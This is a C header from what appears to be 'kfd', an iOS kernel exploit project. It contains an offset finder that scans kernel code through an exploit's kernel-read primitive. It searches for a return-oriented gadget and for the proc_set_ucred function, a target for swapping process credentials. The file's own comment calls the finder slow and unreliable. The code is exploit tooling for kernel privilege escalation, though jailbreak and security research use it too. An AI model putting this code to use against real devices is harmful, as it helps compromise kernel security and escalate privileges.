//
//  mineekpf.h
//  kfd
//
//  Created by Mineek on 06/08/2023.
//

// FIXME: This offsetfinder is not ideal by any means, it's just there to be there and to maybe help people who want to run this for some reason, it's slow, and it can be unreliable.

#ifndef mineekpf_h
#define mineekpf_h

#import <mach/mach.h>
#import <mach-o/dyld.h>
#import <mach-o/getsect.h>
#import <mach-o/loader.h>
#import <mach-o/nlist.h>
#import <mach-o/reloc.h>

static uint64_t textexec_text_addr = 0, textexec_text_size = 0;
static uint64_t prelink_text_addr = 0, prelink_text_size = 0;

static unsigned char *
boyermoore_horspool_memmem(const unsigned char* haystack, size_t hlen,
                           const unsigned char* needle,   size_t nlen)
{
    size_t last, scan = 0;
    size_t bad_char_skip[UCHAR_MAX + 1]; /* Officially called:
                                          * bad character shift */

    /* Sanity checks on the parameters */
    if (nlen <= 0 || !haystack || !needle)
        return NULL;

    /* ---- Preprocess ---- */
    /* Initialize the table to default value */
    /* When a character is encountered that does not occur
     * in the needle, we can safely skip ahead for the whole
     * length of the needle.
     */
    for (scan = 0; scan <= UCHAR_MAX; scan = scan + 1)
        bad_char_skip[scan] = nlen;

    /* C arrays have the first byte at [0], therefore:
     * [nlen - 1] is the last byte of the array. */
    last = nlen - 1;

    /* Then populate it with the analysis of the needle */
    for (scan = 0; scan < last; scan = scan + 1)
        bad_char_skip[needle[scan]] = last - scan;

    /* ---- Do the matching ---- */

    /* Search the haystack, while the needle can still be within it. */
    while (hlen >= nlen)
    {
        /* scan from the end of the needle */
        for (scan = last; haystack[scan] == needle[scan]; scan = scan - 1)
            if (scan == 0) /* If the first byte matches, we've found it. */
                return (void *)haystack;

        /* otherwise, we need to skip some bytes and start again.
           Note that here we are getting the skip value based on the last byte
           of needle, no matter where we didn't match. So if needle is: "abcd"
           then we are skipping based on 'd' and that value will be 4, and
           for "abcdd" we again skip on 'd' but the value will be only 1.
           The alternative of pretending that the mismatched character was
           the last character is slower in the normal case (E.g. finding
           "abcd" in "...azcd..." gives 4 by using 'd' but only
           4-2==2 using 'z'. */
        hlen     -= bad_char_skip[haystack[last]];
        haystack += bad_char_skip[haystack[last]];
    }

    return NULL;
}

void init_kernel(struct kfd* kfd) {
    u64 kernel_base = kfd->info.kernel.kernel_slide + 0xFFFFFFF007004000;
    get_kernel_section(kfd, kernel_base, "__TEXT_EXEC", "__text", &textexec_text_addr, &textexec_text_size);
    assert(textexec_text_addr != 0 && textexec_text_size != 0);
    get_kernel_section(kfd, kernel_base, "__PLK_TEXT_EXEC", "__text", &prelink_text_addr, &prelink_text_size);
    //assert(prelink_text_addr != 0 && prelink_text_size != 0);
}

//https://github.com/xerub/patchfinder64/blob/master/patchfinder64.c#L1213-L1229
u64 find_add_x0_x0_0x40_ret(struct kfd* kfd) {
    static const uint8_t insn[] = { 0x00, 0x00, 0x01, 0x91, 0xc0, 0x03, 0x5f, 0xd6 }; // 0x91010000, 0xD65F03C0
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, insn, sizeof(insn));
        if (str) {
            return str - buffer + textexec_text_addr + current_offset;
        }
        current_offset += 0x1000;
    }
    current_offset = 0;
    while (current_offset < prelink_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, prelink_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, insn, sizeof(insn));
        if (str) {
            return str - buffer + prelink_text_addr + current_offset;
        }
        current_offset += 0x1000;
    }
    return 0;
}

uint64_t bof64(uint64_t kfd, uint64_t ptr) {
    for (; ptr >= 0; ptr -= 4) {
        uint32_t op;
        kread(kfd, (uint64_t)ptr, &op, 4);
        if ((op & 0xffc003ff) == 0x910003FD) {
            unsigned delta = (op >> 10) & 0xfff;
            if ((delta & 0xf) == 0) {
                uint64_t prev = ptr - ((delta >> 4) + 1) * 4;
                uint32_t au;
                kread(kfd, (uint64_t)prev, &au, 4);
                if ((au & 0xffc003e0) == 0xa98003e0) {
                    return prev;
                }
                while (ptr > 0) {
                    ptr -= 4;
                    kread(kfd, (uint64_t)ptr, &au, 4);
                    if ((au & 0xffc003ff) == 0xD10003ff && ((au >> 10) & 0xfff) == delta + 0x10) {
                        return ptr;
                    }
                    if ((au & 0xffc003e0) != 0xa90003e0) {
                        ptr += 4;
                        break;
                    }
                }
            }
        }
    }
    return 0;
}

u64 find_proc_set_ucred_function(struct kfd* kfd) {
    // We find the place that sets up the call to zalloc_ro_mut.
    /*
    a0008052   mov     w0, #0x5
    e10302aa   mov     x1, x2
    02048052   mov     w2, #0x20 <-- 0x20 is the offset of ucred on iOS 15.
    04018052   mov     w4, #0x8
    bl zalloc_ro_mut
    */
    const uint8_t data[16] = { 0xa0, 0x00, 0x80, 0x52, 0xe1, 0x03, 0x02, 0xaa, 0x02, 0x04, 0x80, 0x52, 0x04, 0x01, 0x80, 0x52 };
    int current_offset = 0;
    while (current_offset < textexec_text_size) {
        uint8_t* buffer = malloc(0x1000);
        kread((u64)kfd, textexec_text_addr + current_offset, buffer, 0x1000);
        uint8_t *str;
        str = boyermoore_horspool_memmem(buffer, 0x1000, data, sizeof(data));
        if (str) {
            uint64_t bof = bof64((u64)kfd, str - buffer + textexec_text_addr + current_offset);
            //return str - buffer + textexec_text_addr + current_offset;
            return bof;
        }
        current_offset += 0x1000;
    }
    return 0;
}

#endif /* mineekpf_h */
